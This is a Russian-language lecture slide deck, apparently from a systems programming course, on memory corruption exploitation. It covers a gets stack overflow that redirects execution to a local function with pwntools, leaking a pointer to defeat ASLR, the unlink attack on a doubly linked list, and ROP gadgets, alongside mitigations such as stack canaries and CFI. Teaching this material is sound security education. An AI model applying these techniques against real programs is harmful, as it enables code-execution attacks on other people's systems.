---
marp: true
theme: gaia
class: invert
---

# Memory Corruption Exploitation

---

# Баги

- **Логические** - код выдаёт неправильный ответ
- **Работы с памятью** - "бьют" структуры данных
  - Use after free
  - Double free
  - Stack buffer overflow
  - Type confusion

---

# Memory corruption

- Если вам повезёт, то программа упадёт.
- Атакующий может заставить ваш процесс выполнить произвольный код.

---

# Stack buffer overflow via `gets`

```man
NAME
       gets - get a string from standard input (DEPRECATED)

SYNOPSIS
       #include <stdio.h>

       char *gets(char *s);

DESCRIPTION
       Never use this function.
```

---

# Вызов произвольной функции

```c++
void Boom() {
    std::cerr << "you win" << std::endl;
}

int main(int argc, char* argv[]) {
    char buf[128];
    gets(buf);
    return 0;
}
```

- Код собран без `-fPIE` и без `-fstack-protector`.

---

# Шаги для атаки

- Ловим segfault.

    ```bash
    $ python3 -c 'print("A"*500)' | ./a.out
    fish: Process 21558 terminated by signal SIGSEGV (Address boundary error)
    ```

- Узнаём адрес функции `Boom`. Тут важен флаг `-no-pie`.

    ```bash
    $ nm a.out | grep Boom
    0000000000401212 t _GLOBAL__sub_I__Z4Boomv
    0000000000401186 T _Z4Boomv
    ```

---

# Продолжение атаки на gets

- "Заливаем" стек числом `0x401186`. `-fno-stack-protector`.

    ```bash
    python -c 'from pwn import *; print(p64(0x401186) * 400)' | ./a.out
    you win
    fish: Process 22740 terminated by signal SIGSEGV (Address boundary error)
    ```

---

# Что произошло: stack layout

```text
*----------------*
| return address |     0x401186
*----------------*     0x401186
|                |     ...
|                |     0x401186
| char buf[128]; |     0x401186
*----------------*
```

---

# Переполнение буффера на стеке

- Smashing stack for fun and profit. Phrack 49, 1996.
- Атака не так актуальна в 2018.
- В современном дистрибутиве не определена функция `gets`

---

# ASLR

- `-fPIE` собирает _position independent executable_
- При каждом запуске адрес функции Boom будет новый

```bash
$ g++ -static-pie -fPIC gets.cpp
$ gdb ./a.out
(gdb) set disable-randomization off
(gdb) b main
Breakpoint 1 at 0x1cdbf
(gdb) run
Breakpoint 1, 0x00007fe7872b5dbf in main ()
(gdb) run
Breakpoint 1, 0x00007f47d2bdfdbf in main ()
(gdb) run
```

---

# Stack protector

```bash
$ g++ -fstack-protector gets.cpp
$ python -c 'from pwn import *; print(p64(0x401186) * 400)' | ./a.out
*** stack smashing detected ***: <unknown> terminated
```

```text
*----------------*
| return address |     0x401186
*----------------*     0x401186        mov    -0x8(%rbp),%rdx
| canary         |     0x401186        xor    %fs:0x28,%rdx
*----------------*     0x401186        je     401208 <main+0x4f>
|                |     ...             callq  401080 <__stack_chk_fail@plt>
|                |     0x401186        leaveq
| char buf[128]; |     0x401186        retq
*----------------*
```

---

# Обход ASLR и Stack Canary

- Защита описается на секрет, который не известен атакующему
- ASLR - не известен базовый адрес
- Canary - `%fs:0x28` 64-битное значение в TLS
- Можно использовать второй баг, чтобы "слить" секрет
- fork() часто ломает ASLR

---

# Пример обхода ASLR

```c++
static std::list<int64_t> global_list;

void Boom() {}

int main(int argc, char* argv[]) {
    std::unique_ptr<char[]> buf(new char[32]);
    global_list.push_back(0);

    std::fill(buf.get(), buf.get()+48, 'a');
    std::cout << buf.get() << std::endl;

    return 0;
}
```

---

# Сливаем значение указателя

```bash
$ ./a.out | hexdump -C
00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
*
00000030  40 37 33 fd be 7f 0a                              |@73....|
$ nm a.out | grep global_list
00000000001dd740 b _ZL11global_list
$ nm a.out | grep Boom
000000000001cd39 T _Z4Boomv
```

- `&global_list == 0x7fbefd333740`
- `&Boom - &global_list == 0x1cd39 - 0x1dd740`
- `&Boom == &Boom - &global_list + &global_list`

---

# malloc layout

- Как связаны значения `a` и `b`?
- В обычном C++ нам это не важно
- Необходимо знать для эксплуатации

```c++
auto a = new char[32];
auto b = new ListNode{};
```

```text
*----------*--------*----------*
| char[32] | header | ListNode |
*----------*--------*----------*
 |---  overflow ---|
```

---

# Реализации malloc

- _ptmalloc_ в glibc
  - Дефолт на линуксе
  - Больше всего исследован
  - Много assert-ов внутри, для противодействия атакам
  - Структуры данных находятся рядом с аллокациями
- _jemalloc_
  - Дефолт на freebsd
  - Структуры данных находятся далеко от аллокаций
  - Аллокации сегрегированны по размеру

---

# Атака на двусвязный список

```c++
void Unlink(Node* n) {
    n->prev->next = n->next;
    n->next->prev = n->prev;
}
```

Допустим мы можем переписать `Node` своими данными и позвать `Unlink`. Можно ли получить примитив _запись произвольных данных по произвольному адресу_?

- `n->prev->next = n->next` сделает произвольную запись
- Но следующая строчка приведёт к `SIGSEGV`

---

# Атакуем двусвязный список

- Пусть `A` и `B` - два _writable_ адреса, тогда мы можем выполнить

  ```c++
  *A = B
  *(B+8) = A
  ```

- A и B не могут указывать в секцию кода, потому что в код нельзя писать
- Можно переписать указатель на таблицу функций `vptr`.

---

# Шаги для атаки на список

```c++
struct Greeter {
    virtual void Hello(const char* name);
};

int main() {
    auto g = new Greeter{};
    std::cerr << "leak " << g << std::endl;
    std::list<int> l;
    std::vector<char> buf(64);
    l.push_back(0);
    read(0, buf.data(), 1024);
    l.pop_back();
    g->Hello(buf.get());
    return 0;
}
```

---

# List Hardening

```c++
void Unlink(Node* n) {
    assert(n->prev->next == n);
    assert(n->next->prev == n);
    n->prev->next = n->next;
    n->next->prev = n->prev;
}
```

---

# Return Oriented Programming

- Наши атаки опирались на переписывание указателя на код
- Мы выполняли код, который уже есть в процессе
- Как принести код с собой?
  - Можно записать shell code в буффер
  - Современные системы следуют политике `w^x`

---

# ROP Gadget

```asm
# mem read
> 0x080c1880 : mov eax, [edx + 0x4c]; ret
# mem write
> 0x08088aa2 : add [ecx], eax; ret
# pop
> 0x080c1906 : pop eax; ret
# stack lift
> 0x0809b488 : add esp, 0x20; ret
# stack pivot
> 0x0804bd4c : xchg eax, esp; ret
```

---

# ROP VM

- Виртуальная машина
  - Стек хоста == Код для VM
  - Гаджет == Инструкция для VM
  - Инструкции меняющие esp == JMP в VM
- Можно написать код руками
- Есть компиляторы

---

# Защиты от ROP

- clang `-fsanitize=cfi`
- Intel Control-flow Enforcement Technology
- Microsoft Control Flow Guard

---

# ProjectZero: BitUnmap

---

# How to Start

- http://overthewire.org/wargames/vortex/
- Youtube LiveOverflow
- Играть в ctf с командой
